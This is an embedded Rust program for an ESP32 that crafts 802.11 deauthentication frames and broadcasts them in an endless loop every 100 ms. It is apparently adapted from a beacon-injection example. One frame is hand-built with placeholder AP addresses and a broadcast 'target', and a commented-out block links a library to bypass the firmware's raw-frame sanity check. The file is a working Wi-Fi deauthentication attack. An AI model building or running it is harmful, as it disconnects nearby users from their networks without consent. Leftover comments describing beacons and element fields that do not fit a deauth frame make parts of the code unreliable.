#![no_std]
#![no_main]
#![deny(
    clippy::mem_forget,
    reason = "mem::forget is generally not safe to do with esp_hal types, especially those \
    holding buffers for the duration of a data transfer."
)]

use core::marker::PhantomData;

use alloc::borrow::ToOwned;
use alloc::string::{String, ToString};
use embassy_executor::Spawner;
use esp_backtrace as _;
use esp_hal::delay::Delay;
use esp_hal::time::Duration;
use esp_hal::timer::systimer::SystemTimer;
use esp_hal::timer::timg::TimerGroup;
use esp_hal::{clock::CpuClock, gpio::OutputConfig};
use esp_wifi::wifi::{
    self, AccessPointConfiguration, ClientConfiguration, Configuration, ScanConfig, Sniffer,
    WifiEvent, WifiMode,
};
use ieee80211::common::IEEE80211Reason;
use ieee80211::mgmt_frame::body::{DeauthenticationBody, DisassociationBody};
use ieee80211::mgmt_frame::{DeauthenticationFrame, DisassociationFrame, ManagementFrameHeader};
use ieee80211::{
    common::{CapabilitiesInformation, FCFFlags},
    element_chain,
    elements::{DSSSParameterSetElement, RawIEEE80211Element, SSIDElement},
    mgmt_frame::{body::BeaconBody, BeaconFrame},
    scroll::Pwrite,
    supported_rates,
};
use log::{info, trace, warn};

extern crate alloc;

const SSID: &str = "esp-wifi 802.11 injection";
/// This is an arbitrary MAC address, used for the fake beacon frames.
const MAC_ADDRESS: [u8; 6] = [0x00, 0x80, 0x41, 0x13, 0x37, 0x42];

// #[link(name = "bypass")] // This tells the linker to look for 'bypass.a'
// extern "C" {
//     fn ieee80211_raw_frame_sanity_check(a: i32, b: i32) -> i32;
// }

// This creates a default app-descriptor required by the esp-idf bootloader.
// For more information see: <https://docs.espressif.com/projects/esp-idf/en/stable/esp32/api-reference/system/app_image_format.html#application-description>
esp_bootloader_esp_idf::esp_app_desc!();

#[esp_hal_embassy::main]
async fn main(spawner: Spawner) {
    // generator version: 0.5.0

    esp_println::logger::init_logger_from_env();

    let config = esp_hal::Config::default().with_cpu_clock(CpuClock::max());
    let peripherals = esp_hal::init(config);

    esp_alloc::heap_allocator!(size: 64 * 1024);

    let timer0 = SystemTimer::new(peripherals.SYSTIMER);
    esp_hal_embassy::init(timer0.alarm0);

    info!("Embassy initialized!");

    let rng = esp_hal::rng::Rng::new(peripherals.RNG);
    let timer1 = TimerGroup::new(peripherals.TIMG0);
    let wifi_init =
        esp_wifi::init(timer1.timer0, rng).expect("Failed to initialize WIFI/BLE controller");
    let (mut wifi_controller, interfaces) = esp_wifi::wifi::new(&wifi_init, peripherals.WIFI)
        .expect("Failed to initialize WIFI controller");

    let delay = Delay::new();

    wifi_controller.set_mode(wifi::WifiMode::Sta).unwrap();
    wifi_controller.start().unwrap();

    let mut sniffer = interfaces.sniffer;

    // Create a buffer, which can hold the enitre serialized beacon frame.
    let mut beacon = [0u8; 300];
    let length = beacon
        .pwrite(
            DeauthenticationFrame {
                header: ManagementFrameHeader {
                    fcf_flags: FCFFlags::new(),
                    duration: 0x3a,
                    receiver_address: [0xff; 6].into(),
                    transmitter_address: [0x00; 6].into(),
                    bssid: [0x00; 6].into(),
                    ..Default::default()
                },
                body: DeauthenticationBody {
                    reason: IEEE80211Reason::InvalidAuthentication,
                    // We transmit a beacon every 100 ms/TUs
                    elements: element_chain! {
                        SSIDElement::new(SSID).unwrap(),
                        // These are known good values.
                        supported_rates![
                            1 B,
                            2 B,
                            5.5 B,
                            11 B,
                            6,
                            9,
                            12,
                            18
                        ],
                        DSSSParameterSetElement {
                            current_channel: 11,
                        },
                        // This contains the Traffic Indication Map(TIM), for which `ieee80211-rs` currently lacks support.
                        RawIEEE80211Element {
                            tlv_type: 5,
                            slice: [0x01, 0x02, 0x00, 0x00].as_slice(),
                            _phantom: PhantomData
                        }
                    },
                    _phantom: PhantomData,
                },
            },
            0,
        )
        .unwrap();
    // Only use the actually written bytes.
    let beacon = &beacon[..length];

    info!("Scan for WiFi networks and find `esp-wifi 802.11 injection`");

    let buffer = [
        /*  0 - 1  */ 0xC0_u8, 0x00, // type, subtype c0: deauth (a0: disassociate)
        /*  2 - 3  */ 0x3A, 0x01, // duration
        /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
        /* 10 - 15 */
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
        /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
        /* 22 - 23 */ 0x00, 0x00, // fragment & squence number
        /* 24 - 25 */ 0x02, 0x00, // reason code (1 = unspecified reason)
    ];
    info!("{:?}", beacon);
    info!("{:?}", buffer);
    loop {
        sniffer.send_raw_frame(true, beacon, true).unwrap();
        sniffer.send_raw_frame(true, &buffer, false).unwrap();
        delay.delay(Duration::from_millis(100));
    }

    // for inspiration have a look at the examples at https://github.com/esp-rs/esp-hal/tree/esp-hal-v1.0.0-rc.0/examples/src/bin
}
